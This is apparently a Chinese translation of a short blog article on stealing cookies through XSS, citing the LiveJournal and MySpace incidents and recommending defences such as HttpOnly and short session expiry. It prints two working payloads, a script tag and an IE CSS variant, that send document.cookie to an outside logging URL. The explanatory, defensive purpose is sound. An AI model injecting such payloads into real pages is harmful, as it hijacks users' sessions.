---
title: XSS攻击之窃取Cookie

date: 2017-08-15 10:00:00

tags: [JavaScript, 翻译]

---

**译者按:** 10年前的博客似乎有点老了，但是**XSS攻击**的威胁依然还在，我们不得不防。

<!-- more -->

原文: [XSS - Stealing Cookies 101](http://jehiah.cz/a/xss-stealing-cookies-101)

译者: [Fundebug](https://fundebug.com/)

**为了保证可读性，本文采用意译而非直译。另外，本文版权归原作者所有，翻译仅用于学习。**

窃取**Cookie**是非常简单的，因此不要轻易相信客户端所声明的身份。即便这个**Cookie**是在数秒之前验证过，那也未必是真的，尤其当你仅使用**Cookie**验证客户端的时候。

2006年1月，[**LiveJournal**遭到了**XSS**攻击](http://voices.washingtonpost.com/securityfix/2006/01/account_hijackings_force_livej.html)，这个事件足以警示我们。还有，2006年10月，[**MySapce**也遭到了**XSS**攻击](https://zh.wikipedia.org/wiki/%E8%90%A8%E7%B1%B3_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A0%95%E8%99%AB))，这告诉我们必须非常谨慎地过滤用户发布的文本，因为黑客可以在文本中掺杂一些JavaScript代码，以此窃取登陆用户的**Cookie**。

正如黑客攻击**LiveJournal**那样，你不需要在登陆用户的浏览器进行任何操作，而可以在第三方进行所有操作。更糟糕的是，窃取**Cookie**事实上**操作起来非常简单**，但是**防范起来却非常困难**。

下面的的JavaScript代码就可以窃取**Cookie**，是不是很简单？

```html
<script>
new Image().src="http://jehiah.com/_sandbox/log.cgi?c="+encodeURI(document.cookie);
</script>
```

如果我可以将这段代码插入到某个登陆用户的页面，则**Cookie**就会通过HTTP请求发送给我，然后我就可以伪造那个可怜的登陆用户了！

在IE浏览器上，可以通过在CSS代码中执行JavaScript来窃取**Cookie**，也很简单。

```css
<style>
.getcookies{
    background-image:url('javascript:new Image().src="http://jehiah.com/_sandbox/log.cgi?c=" + encodeURI(document.cookie);');
}
</style>
<p class="getcookies"></p>
```

如果你对用户发布的文本内容不进行严格的过滤的话，黑客就可以很方便地窃取**Cookie**。是不是很可怕？**如果你是一个负责任的开发者的话，你就应该保持警惕！**因此，你必须假设所有用户的**Cookie**都被窃取了。注意，是**所有用户**，对于这一点，我不想含糊其辞。

为了保证安全：请不停地重设**session**的重设；将过期时间设置短一些；监控**referrer**与**userAgent**的值；使用[HttpOnly](http://www.owasp.org/index.php/HttpOnly)禁止脚本读取**Cookie**。这些措施并非万无一失，但是增加了黑客的难度，因此也是有效的。

如果你对[**MySapce**遭到的**XSS**攻击](https://zh.wikipedia.org/wiki/%E8%90%A8%E7%B1%B3_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A0%95%E8%99%AB))不了解，可以查看黑客本人公开的[技术细节](http://samy.pl/popular/tech.html)，很有趣，不过切勿模仿，因为他为自己的行为此付出了不小的代价：**三年内被禁止使用电脑！**。

### 参考链接

- [9.3 避免XSS攻击](https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.3.md)
- [萨米 (计算机蠕虫)](https://zh.wikipedia.org/wiki/%E8%90%A8%E7%B1%B3_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A0%95%E8%99%AB))
- [Technical explanation of The MySpace Worm](http://samy.pl/popular/tech.html)
- [Account Hijackings Force LiveJournal Changes](http://voices.washingtonpost.com/securityfix/2006/01/account_hijackings_force_livej.html)


<div style="text-align: center;">
<img style="width:30%;" src="https://blog.fundebug.com/images/qq_bug.JPG" />
</div>